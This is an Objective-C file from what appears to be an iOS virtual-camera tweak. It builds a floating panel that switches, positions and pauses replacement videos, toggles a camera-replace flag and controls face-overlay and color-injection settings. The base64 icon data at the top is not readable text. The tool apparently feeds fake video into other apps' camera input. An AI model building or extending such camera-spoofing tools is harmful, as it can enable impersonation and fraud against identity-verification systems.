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";
    NSData *data = [[NSData alloc] initWithBase64EncodedString:b64 options:0];
    if (data) img = [UIImage imageWithData:data scale:2.0];
    return img;
}

// --- Floating Window ---
@interface PTWnd : UIWindow
@end
@implementation PTWnd
- (UIView *)hitTest:(CGPoint)point withEvent:(UIEvent *)event {
    UIView *v = [super hitTest:point withEvent:event];
    if (v == self || v == self.rootViewController.view) return nil;
    return v;
}
@end

@interface FWCtrl : NSObject
+ (instancetype)shared;
+ (void)show;
+ (void)hide;
@end
@implementation FWCtrl {
    PTWnd *_window;
    UIButton *_floatBtn;
    UIView *_panel;
    BOOL _panelVisible;
    NSMutableArray<UIButton *> *_numButtons;
    UIButton *_colorInjectBtn;
    NSTimer *_colorSampleTimer;
    UIView *_colorIndicator;  // Small circle showing sampled color
    // "预览" / "替" buttons hidden from UI; ivar kept so dead methods still compile
    UIButton *_replaceBtn;
    // Preview screen
    UIWindow *_pvWindow;
    AVPlayer *_pvPlayer;
    AVPlayerLayer *_pvPlayerLayer;
    AVPlayerItemVideoOutput *_pvVideoOutput;
    UIView *_pvFaceOverlay;      // Face overlay container
    CAShapeLayer *_pvFaceShapeLayer; // Face contour shape layer for mode 0
    UIView *_pvBorderT, *_pvBorderB, *_pvBorderL, *_pvBorderR;
    NSTimer *_pvTestTimer;
    NSTimer *_pvFaceTimer;
    int _pvTestPhase;
    BOOL _pvFaceDbgReset;
    // Adjustable face color parameter controls
    UISegmentedControl *_pvModeCtrl;
    UISlider *_pvSliderAlpha;
    UISlider *_pvSliderDiameter;
    UISlider *_pvSliderOffX;
    UISlider *_pvSliderOffY;
    UILabel *_pvValAlpha;
    UILabel *_pvValDiameter;
    UILabel *_pvValOffX;
    UILabel *_pvValOffY;
}
+ (instancetype)shared {
    static FWCtrl *inst; static dispatch_once_t once;
    dispatch_once(&once, ^{ inst = [[FWCtrl alloc] init]; });
    return inst;
}
+ (void)show {
    vcam_log([NSString stringWithFormat:@"FloatingWindow show in process: %@", [[NSProcessInfo processInfo] processName]]);
    dispatch_async(dispatch_get_main_queue(), ^{ [[FWCtrl shared] doShow]; });
}
+ (void)hide {
    dispatch_async(dispatch_get_main_queue(), ^{ [[FWCtrl shared] doHide]; });
}
- (void)doShow {
    if (_window) { _window.hidden = NO; return; }
    _numButtons = [NSMutableArray new];
    UIWindowScene *scene = nil;
    for (UIScene *s in [UIApplication sharedApplication].connectedScenes) {
        if ([s isKindOfClass:[UIWindowScene class]]) { scene = (UIWindowScene *)s; break; }
    }
    _window = scene ? [[PTWnd alloc] initWithWindowScene:scene]
                    : [[PTWnd alloc] initWithFrame:[UIScreen mainScreen].bounds];
    _window.windowLevel = UIWindowLevelAlert + 100;
    _window.backgroundColor = [UIColor clearColor];
    UIViewController *vc = [[UIViewController alloc] init];
    vc.view.backgroundColor = [UIColor clearColor];
    _window.rootViewController = vc;
    _window.frame = [UIScreen mainScreen].bounds;
    // Float button
    _floatBtn = [UIButton buttonWithType:UIButtonTypeCustom];
    _floatBtn.frame = CGRectMake(20, 100, 44, 44);
    _floatBtn.layer.cornerRadius = 22;
    _floatBtn.clipsToBounds = YES;
    UIImage *iconImg = _floatIconImage();
    if (iconImg) {
        [_floatBtn setImage:iconImg forState:UIControlStateNormal];
        _floatBtn.imageView.contentMode = UIViewContentModeScaleAspectFit;
    } else {
        _floatBtn.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.6];
        [_floatBtn setTitle:@"\xF0\x9F\x8E\xA5" forState:UIControlStateNormal];
        _floatBtn.titleLabel.font = [UIFont systemFontOfSize:20];
    }
    [_floatBtn addTarget:self action:@selector(togglePanel) forControlEvents:UIControlEventTouchUpInside];
    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(handlePan:)];
    [_floatBtn addGestureRecognizer:pan];
    [vc.view addSubview:_floatBtn];
    // Panel
    [self buildPanel];
    _panel.hidden = YES;
    [vc.view addSubview:_panel];
    _window.hidden = NO;
}
- (void)doHide {
    _panelVisible = NO;
    _panel.hidden = YES;
    _window.hidden = YES;
}
- (void)togglePanel {
    _panelVisible = !_panelVisible;
    if (_panelVisible) {
        [self positionPanel];
        [self updateHighlight];
    }
    _panel.hidden = !_panelVisible;
}
- (void)positionPanel {
    CGFloat bx = CGRectGetMinX(_floatBtn.frame);
    CGFloat by = CGRectGetMaxY(_floatBtn.frame) + 8;
    CGFloat pw = 196, ph = 244;
    CGRect screen = [UIScreen mainScreen].bounds;
    if (by + ph > screen.size.height - 20) by = CGRectGetMinY(_floatBtn.frame) - ph - 8;
    if (bx + pw > screen.size.width - 10) bx = screen.size.width - pw - 10;
    if (bx < 10) bx = 10;
    if (by < 10) by = 10;
    _panel.frame = CGRectMake(bx, by, pw, ph);
    [self positionPreviewBtn];
}
- (void)positionPreviewBtn {
    // no-op since preview/replace UI buttons removed (build 191)
}
- (void)handlePan:(UIPanGestureRecognizer *)pan {
    CGPoint t = [pan translationInView:_floatBtn.superview];
    CGPoint c = _floatBtn.center;
    c.x += t.x; c.y += t.y;
    CGRect bounds = [UIScreen mainScreen].bounds;
    c.x = MAX(22, MIN(c.x, bounds.size.width - 22));
    c.y = MAX(22, MIN(c.y, bounds.size.height - 22));
    _floatBtn.center = c;
    [pan setTranslation:CGPointZero inView:_floatBtn.superview];
    if (_panelVisible) [self positionPanel];
    [self positionPreviewBtn];
}
- (UIButton *)makeBtnWithTitle:(NSString *)title tag:(int)tag {
    UIButton *btn = [UIButton buttonWithType:UIButtonTypeCustom];
    btn.backgroundColor = [UIColor whiteColor];
    btn.layer.cornerRadius = 6;
    btn.clipsToBounds = YES;
    [btn setTitle:title forState:UIControlStateNormal];
    [btn setTitleColor:[UIColor blackColor] forState:UIControlStateNormal];
    btn.titleLabel.font = [UIFont systemFontOfSize:16];
    btn.tag = tag;
    [btn addTarget:self action:@selector(btnTap:) forControlEvents:UIControlEventTouchUpInside];
    return btn;
}
- (void)buildPanel {
    CGFloat pw = 196, ph = 244;
    _panel = [[UIView alloc] initWithFrame:CGRectMake(20, 152, pw, ph)];
    _panel.backgroundColor = [[UIColor lightGrayColor] colorWithAlphaComponent:0.85];
    _panel.layer.cornerRadius = 12;
    _panel.clipsToBounds = YES;
    // 4x4 grid + row 5 for color inject (padding=4, button=44, gap=4)
    // Row 0: up, rotate, 1, 2
    // Row 1: left, reset, right, 3
    // Row 2: down, flip, 4, 5
    // Row 3: play, pause, close, 6
    // Row 4: color inject toggle, intensity+, intensity-, [indicator]
    NSArray *titles = @[
        @"\u2191", @"\u8F6C", @"1", @"2",
        @"\u2190", @"\u6B63", @"\u2192", @"3",
        @"\u2193", @"\u7FFB", @"4", @"5",
        @"\u25B6", @"\u23F8", @"\u5173", @"6"
    ];
    int tags[] = {100,101,1,2, 102,103,104,3, 105,106,4,5, 107,108,109,6};
    for (int row = 0; row < 4; row++) {
        for (int col = 0; col < 4; col++) {
            int idx = row * 4 + col;
            CGFloat x = 4 + col * 48;
            CGFloat y = 4 + row * 48;
            UIButton *btn = [self makeBtnWithTitle:titles[idx] tag:tags[idx]];
            btn.frame = CGRectMake(x, y, 44, 44);
            [_panel addSubview:btn];
            if (tags[idx] >= 1 && tags[idx] <= 6) [_numButtons addObject:btn];
        }
    }
    // Row 4: color injection controls (彩=toggle, +=intensity up, -=intensity down, indicator)
    CGFloat row4Y = 4 + 4 * 48;
    _colorInjectBtn = [self makeBtnWithTitle:@"\u5F69" tag:110]; // 彩
    _colorInjectBtn.frame = CGRectMake(4, row4Y, 44, 44);
    [_colorInjectBtn setTitleColor:[UIColor lightGrayColor] forState:UIControlStateNormal];
    [_panel addSubview:_colorInjectBtn];

    UIButton *intUp = [self makeBtnWithTitle:@"+" tag:111];
    intUp.frame = CGRectMake(52, row4Y, 44, 44);
    [_panel addSubview:intUp];

    UIButton *intDown = [self makeBtnWithTitle:@"-" tag:112];
    intDown.frame = CGRectMake(100, row4Y, 44, 44);
    [_panel addSubview:intDown];

    // Color indicator circle (shows sampled color, larger for visibility)
    _colorIndicator = [[UIView alloc] initWithFrame:CGRectMake(152, row4Y + 6, 32, 32)];
    _colorIndicator.layer.cornerRadius = 16;
    _colorIndicator.layer.borderWidth = 2;
    _colorIndicator.layer.borderColor = [UIColor whiteColor].CGColor;
    _colorIndicator.backgroundColor = [UIColor blackColor];
    _colorIndicator.userInteractionEnabled = NO;
    _colorIndicator.hidden = YES;
    [_panel addSubview:_colorIndicator];
}
- (void)updateHighlight {
    for (UIButton *btn in _numButtons) {
        if (btn.tag == gVideoIndex) {
            btn.layer.borderColor = [UIColor systemBlueColor].CGColor;
            btn.layer.borderWidth = 2.5;
        } else {
            btn.layer.borderColor = nil;
            btn.layer.borderWidth = 0;
        }
    }
}
- (void)btnTap:(UIButton *)btn {
    int tag = (int)btn.tag;
    if (tag >= 1 && tag <= 6) {
        vcam_switchVideo(tag);
        [self updateHighlight];
        vcam_writeControls();
        return;
    }
    switch (tag) {
        case 100: gVideoOffsetY += 0.05; break;           // ↑
        case 101: gVideoRotation = (gVideoRotation + 90) % 360; break; // 转
        case 102: gVideoOffsetX -= 0.05; break;            // ←
        case 103: gVideoOffsetX = 0; gVideoOffsetY = 0;
            vcam_log(@"RESET offsets to 0,0"); break; // 正
        case 104: gVideoOffsetX += 0.05; break;            // →
        case 105: gVideoOffsetY -= 0.05; break;            // ↓
        case 106: gVideoFlipH = !gVideoFlipH; break;       // 翻
        case 107: gVideoPaused = NO; break;                    // ▶
        case 108: gVideoPaused = YES; break;                   // ⏸
        case 109: [self doHide]; break;                     // 关
        case 110: [self toggleColorInject]; return;            // 彩
        case 111:                                              // + intensity
            gInjectAlpha = MIN(1.0, gInjectAlpha + 0.05);
            [self updateColorInjectUI];
            break;
        case 112:                                              // - intensity
            gInjectAlpha = MAX(0.05, gInjectAlpha - 0.05);
            [self updateColorInjectUI];
            break;
    }
    if (tag != 109) {
        vcam_writeControls();
        vcam_log([NSString stringWithFormat:@"Button tag=%d rot=%d flip=%@ pause=%@ offX=%.2f offY=%.2f ci=%@ alpha=%.2f",
            tag, gVideoRotation, gVideoFlipH ? @"Y" : @"N", gVideoPaused ? @"Y" : @"N",
            gVideoOffsetX, gVideoOffsetY, gColorInject ? @"Y" : @"N", gInjectAlpha]);
    }
}
- (void)toggleColorInject {
    gColorInject = !gColorInject;
    if (gColorInject) {
        [self startColorSampling];
    } else {
        [self stopColorSampling];
        gInjectR = 0; gInjectG = 0; gInjectB = 0;
    }
    [self updateColorInjectUI];
    vcam_writeControls();
    vcam_log([NSString stringWithFormat:@"ColorInject %@, alpha=%.2f", gColorInject ? @"ON" : @"OFF", gInjectAlpha]);
}
- (void)updateColorInjectUI {
    if (gColorInject) {
        [_colorInjectBtn setTitleColor:[UIColor systemGreenColor] forState:UIControlStateNormal];
        _colorInjectBtn.layer.borderColor = [UIColor systemGreenColor].CGColor;
        _colorInjectBtn.layer.borderWidth = 2;
        _colorIndicator.hidden = NO;
        _colorIndicator.backgroundColor = [UIColor colorWithRed:gInjectR green:gInjectG blue:gInjectB alpha:1.0];
    } else {
        [_colorInjectBtn setTitleColor:[UIColor lightGrayColor] forState:UIControlStateNormal];
        _colorInjectBtn.layer.borderColor = nil;
        _colorInjectBtn.layer.borderWidth = 0;
        _colorIndicator.hidden = YES;
        _colorIndicator.backgroundColor = [UIColor blackColor];
    }
}
- (void)toggleReplace {
    BOOL en = vcam_flagExists();
    if (en) {
        // Disable — remove flag file
        [[NSFileManager defaultManager] removeItemAtPath:VCAM_FLAG error:nil];
        vcam_log(@"Replace OFF via toggle button");
    } else {
        // Enable — create flag file
        [@"1" writeToFile:VCAM_FLAG atomically:YES encoding:NSUTF8StringEncoding error:nil];
        vcam_log(@"Replace ON via toggle button");
    }
    [self updateReplaceBtn];
}
- (void)updateReplaceBtn {
    BOOL en = vcam_flagExists();
    if (en) {
        _replaceBtn.backgroundColor = [[UIColor systemGreenColor] colorWithAlphaComponent:0.85];
        _replaceBtn.layer.borderColor = [UIColor whiteColor].CGColor;
        _replaceBtn.layer.borderWidth = 1.5;
    } else {
        _replaceBtn.backgroundColor = [[UIColor systemRedColor] colorWithAlphaComponent:0.65];
        _replaceBtn.layer.borderColor = nil;
        _replaceBtn.layer.borderWidth = 0;
    }
}
